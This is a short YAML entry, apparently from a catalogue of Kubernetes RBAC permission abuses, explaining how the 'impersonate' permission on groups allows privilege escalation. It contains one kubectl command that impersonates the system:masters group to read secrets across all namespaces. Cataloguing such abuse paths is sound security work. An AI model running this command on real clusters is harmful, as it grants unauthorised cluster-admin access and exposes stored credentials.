---
verb: "impersonate"
resource: "groups"
description: "Impersonate privileged groups like system:masters"
abuses:
  - type: "Privilege Escalation"
    description: "Impersonate system:masters or other privileged groups to gain cluster admin access"
    code: |
      # Impersonate system:masters group
      kubectl --as-group=system:masters get secrets --all-namespaces
---